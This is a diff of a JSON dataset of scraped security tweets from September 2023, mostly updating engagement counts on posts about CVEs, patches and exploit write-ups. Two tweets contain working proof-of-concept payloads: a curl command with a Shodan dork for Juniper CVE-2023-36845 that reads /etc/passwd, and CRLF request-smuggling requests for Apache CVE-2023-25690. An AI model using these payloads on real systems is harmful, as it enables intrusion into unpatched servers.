@@ -2,20 +2,20 @@
     "expanded_url": [
         "https://securityintelligence.com/posts/msmq-queuejumper-rce-vulnerability-technical-analysis/#"
     ],
-    "tweetfavorites": 177,
+    "tweetfavorites": 166,
     "tweetquotes": 0,
     "tweetreplies": 0,
-    "tweetretweets": 50,
+    "tweetretweets": 49,
     "tweettext": "Analysis of an RCE vulnerability affecting the Microsoft Message Queueing (MSMQ) service (CVE-2023-21554).\nGreat work by Valentina Palmiotti (@chompie1337), Fabius Watson (@FabiusArtrel), and Aaron Portnoy (@aaronportnoy)\n\nhttps://t.co/b8tNhGALSF\n\n#exploit #rce #cybersecurity https://t.co/fxanxj5TE5",
     "tweettime": "2023-09-30, 07:30:11",
     "tweeturl": "https://twitter.com/0xor0ne/status/1708021407970463944",
     "username": "0xor0ne"
 }
 {
-    "tweetfavorites": 429,
+    "tweetfavorites": 411,
     "tweetquotes": 4,
     "tweetreplies": 4,
-    "tweetretweets": 105,
+    "tweetretweets": 102,
     "tweettext": "There is a lot of confusion and a lot of interesting aspects about the 𝐀𝐂𝐓𝐈𝐕𝐄𝐋𝐘 𝐄𝐗𝐏𝐋𝐎𝐈𝐓𝐄𝐃 #libwebp vulnerability CVE-2023-4863.\n\nI'll try to breakdown the chain of events in this thread 🧵\n(1/12)\n#CyberSecurity #CVE #Meme https://t.co/ORNP7Cm8L1",
     "tweettime": "2023-09-29, 22:32:38",
     "tweeturl": "https://twitter.com/pyotam2/status/1707886125988061450",
@@ -74,10 +74,10 @@
     "username": "sector7_nl"
 }
 {
-    "tweetfavorites": 293,
+    "tweetfavorites": 286,
     "tweetquotes": 0,
-    "tweetreplies": 3,
-    "tweetretweets": 110,
+    "tweetreplies": 4,
+    "tweetretweets": 107,
     "tweettext": "finally Juniper - Remote Code Execution 🔥 ( CVE-2023-36845 )  \nShodan Dork : title:\"Juniper\" http.favicon.hash:2141724739  \n\nPoc: curl &lt;TARGET&gt; -F $'auto_prepend_file=\"/etc/passwd\\n\"' -F 'PHPRC=/dev/fd/0'\n\n#bugbountytips #bugbounty #CVE-2023-36845 #RCE https://t.co/FbXzJzcxHW",
     "tweettime": "2023-09-28, 09:56:02",
     "tweeturl": "https://twitter.com/zapstiko/status/1707333333292838946",
@@ -123,7 +123,7 @@
     "tweetfavorites": 218,
     "tweetquotes": 9,
     "tweetreplies": 9,
-    "tweetretweets": 104,
+    "tweetretweets": 105,
     "tweettext": "⚠️ CRITICAL ALERT\n🚨 ZERO-DAY on Chrome\n\nGoogle has patched the fifth Chrome zero-day vulnerability exploited in attacks since the start of the year in emergency security updates released today.\n\nUPDATE YOUR DEVICES NOW &amp; PLEASE SHARE!\n\nCVE-2023-5217 https://t.co/ErkYnLWleG",
     "tweettime": "2023-09-27, 22:38:56",
     "tweeturl": "https://twitter.com/wallet_guard/status/1707162938669142435",
@@ -133,10 +133,10 @@
     "expanded_url": [
         "https://nvd.nist.gov/vuln/detail/CVE-2023-29357"
     ],
-    "tweetfavorites": 281,
+    "tweetfavorites": 275,
     "tweetquotes": 7,
     "tweetreplies": 1,
-    "tweetretweets": 85,
+    "tweetretweets": 84,
     "tweettext": "CVE-2023-29357\n\nCVSS score: 9.8\n\nAffected product(s),verison(s): Microsoft SharePoint\n\nAn attacker exploiting this flaw could gain administrator-level privileges without requiring any prior authentication.\n\nhttps://t.co/kDz1J8tOaW\n\n#cybersecurity #infosec #exploit https://t.co/yETUrSaym8",
     "tweettime": "2023-09-27, 16:00:02",
     "tweeturl": "https://twitter.com/DailyDarkWeb/status/1707062549022142473",
@@ -163,7 +163,7 @@
     "username": "chybeta"
 }
 {
-    "tweetfavorites": 56,
+    "tweetfavorites": 54,
     "tweetquotes": 1,
     "tweetreplies": 0,
     "tweetretweets": 6,
@@ -213,7 +213,7 @@
     "username": "0xor0ne"
 }
 {
-    "tweetfavorites": 368,
+    "tweetfavorites": 367,
     "tweetquotes": 6,
     "tweetreplies": 6,
     "tweetretweets": 86,
@@ -265,10 +265,10 @@
     "expanded_url": [
         "https://www.zerodayinitiative.com/blog/2023/8/1/exploiting-a-flaw-in-bitmap-handling-in-windows-user-mode-printer-drivers"
     ],
-    "tweetfavorites": 251,
+    "tweetfavorites": 240,
     "tweetquotes": 1,
     "tweetreplies": 1,
-    "tweetretweets": 75,
+    "tweetretweets": 71,
     "tweettext": "Interesting reading on Windows privilege escalation through Use-After-Free (UAF) in win32kfull (CVE-2023-21822)\nCredits Marcin Wiązowski (@thezdi)\n\nhttps://t.co/H842SjZa71\n\n#exploit #Windows #infosec https://t.co/c5H0IwuJt2",
     "tweettime": "2023-09-24, 07:30:02",
     "tweeturl": "https://twitter.com/0xor0ne/status/1705847042843492538",
@@ -304,10 +304,10 @@
     "expanded_url": [
         "https://securityonline.info/poc-released-for-chrome-zero-day-cve-2023-4863-vulnerability/"
     ],
-    "tweetfavorites": 81,
+    "tweetfavorites": 78,
     "tweetquotes": 0,
     "tweetreplies": 1,
-    "tweetretweets": 22,
+    "tweetretweets": 19,
     "tweettext": "PoC released for Chrome zero-day CVE-2023-4863 vulnerability https://t.co/PaGnSvv4gq",
     "tweettime": "2023-09-22, 17:56:13",
     "tweeturl": "https://twitter.com/Dinosn/status/1705279848279584988",
@@ -327,10 +327,10 @@
     "expanded_url": [
         "https://blog.isosceles.com/the-webp-0day/"
     ],
-    "tweetfavorites": 850,
+    "tweetfavorites": 846,
     "tweetquotes": 32,
     "tweetreplies": 15,
-    "tweetretweets": 341,
+    "tweetretweets": 336,
     "tweettext": "\"The WebP 0day\" -- a full technical analysis the recently patched vulnerability in the WebP image library that was exploited in the wild (CVE-2023-4863). https://t.co/6yUcE9sOZa",
     "tweettime": "2023-09-21, 17:20:30",
     "tweeturl": "https://twitter.com/benhawkes/status/1704908471815356506",
@@ -404,7 +404,7 @@
     "expanded_url": [
         "https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html"
     ],
-    "tweetfavorites": 117,
+    "tweetfavorites": 113,
     "tweetquotes": 1,
     "tweetreplies": 2,
     "tweetretweets": 50,
@@ -417,10 +417,10 @@
     "expanded_url": [
         "https://github.com/metaredteam/external-disclosures/security/advisories/GHSA-x7ch-h5rf-w2mf"
     ],
-    "tweetfavorites": 695,
+    "tweetfavorites": 643,
     "tweetquotes": 10,
-    "tweetreplies": 12,
-    "tweetretweets": 176,
+    "tweetreplies": 11,
+    "tweetretweets": 160,
     "tweettext": "Time for an Arm-twist! CVE-2023-4039\n\nTom Hebb (Meta red team) and I discovered an 0day in GCC (for AArch64 targets) during my Arm exploitation training. \n\nIt renders stack canaries against overflows of dynamically-sized variables useless. \n\nhttps://t.co/q0vX86e9gK https://t.co/0NDB39Xg8f",
     "tweettime": "2023-09-12, 15:52:12",
     "tweeturl": "https://twitter.com/Fox0x01/status/1701624762059895228",
@@ -440,10 +440,10 @@
     "expanded_url": [
         "https://thehackernews.com/2023/09/google-rushes-to-patch-critical-chrome.html"
     ],
-    "tweetfavorites": 469,
+    "tweetfavorites": 470,
     "tweetquotes": 13,
     "tweetreplies": 10,
-    "tweetretweets": 293,
+    "tweetretweets": 292,
     "tweettext": "Urgent: Google releases patch for a new Chrome zero-day #vulnerability (CVE-2023-4863) that's being exploited in the wild.\n\nRead: https://t.co/41SANY0lKi\n\nDon't wait—update your browser now to protect against potential cyber threats.\n\n#cybersecurity #informationsecurity",
     "tweettime": "2023-09-12, 05:17:51",
     "tweeturl": "https://twitter.com/TheHackersNews/status/1701465123095785662",
@@ -453,10 +453,10 @@
     "expanded_url": [
         "https://securityonline.info/cve-2023-4863-new-chrome-0-day-bug-under-active-attacks/"
     ],
-    "tweetfavorites": 207,
+    "tweetfavorites": 196,
     "tweetquotes": 1,
     "tweetreplies": 1,
-    "tweetretweets": 83,
+    "tweetretweets": 82,
     "tweettext": "CVE-2023-4863: Critical Chrome 0-day Bug Under Active Attacks https://t.co/SamFLswF3L",
     "tweettime": "2023-09-12, 05:11:41",
     "tweeturl": "https://twitter.com/Dinosn/status/1701463569550782635",
@@ -492,14 +492,27 @@
     "expanded_url": [
         "https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/"
     ],
-    "tweetfavorites": 274,
+    "tweetfavorites": 263,
     "tweetquotes": 0,
     "tweetreplies": 0,
-    "tweetretweets": 96,
+    "tweetretweets": 91,
     "tweettext": "CVE-2022-34718: Patch analysis, bug identification and exploit development (Windows TCP/IP Remote Code Execution Vulnerability)\nExcellent blog post by @chompie1337 \n\nhttps://t.co/ZDEOVqM765 \n\n#cybersecurity #cve #exploit https://t.co/7WfuQUqbeG",
     "tweettime": "2023-09-11, 16:30:13",
     "tweeturl": "https://twitter.com/0xor0ne/status/1701271939149389927",
     "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://www.mandiant.com/resources/blog/arbitrary-file-deletion-vulnerabilities"
+    ],
+    "tweetfavorites": 530,
+    "tweetquotes": 6,
+    "tweetreplies": 8,
+    "tweetretweets": 208,
+    "tweettext": "💥BOOM!💥 Another privilege escalation blog, this time showcasing how to convert arbitrary file deletions 🗑️ to SYSTEM command prompt🌈 CVE-2023-27470. Learn about TOCTOU, pseudo-symlinks, MSI rollback exploits, and, of course, how to protect yourselves!\n\nhttps://t.co/S3HCXdvoBY",
+    "tweettime": "2023-09-11, 14:08:58",
+    "tweeturl": "https://twitter.com/AndrewOliveau/status/1701236395237392752",
+    "username": "AndrewOliveau"
 }
 {
     "expanded_url": [
@@ -518,7 +531,7 @@
     "expanded_url": [
         "https://github.com/bjrjk/CVE-2022-4262/blob/main/CVE-2022-4262.md"
     ],
-    "tweetfavorites": 121,
+    "tweetfavorites": 122,
     "tweetquotes": 0,
     "tweetreplies": 1,
     "tweetretweets": 33,
@@ -531,7 +544,7 @@
     "expanded_url": [
         "https://github.com/cve-sandbox/jquery"
     ],
-    "tweetfavorites": 308,
+    "tweetfavorites": 300,
     "tweetquotes": 1,
     "tweetreplies": 3,
     "tweetretweets": 68,
@@ -541,10 +554,10 @@
     "username": "therceman"
 }
 {
-    "tweetfavorites": 630,
+    "tweetfavorites": 604,
     "tweetquotes": 2,
     "tweetreplies": 0,
-    "tweetretweets": 228,
+    "tweetretweets": 219,
     "tweettext": "⚠️ CVE-2023-25690 (  POC )\n\n- Apache HTTP Server mod_proxy \n\nCLRF Injection\nGET /categories/1%20HTTP/1.1%0d%0aFoo:%20baarr HTTP/1.1\nHost: \n\nHeader Injection\nGET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1\nHost: 1.1.1.1\n\nGitHub URL :- https://t.co/F71FfNcDDh",
     "tweettime": "2023-09-06, 05:14:16",
     "tweeturl": "https://twitter.com/TodayCyberNews/status/1699289891518193936",
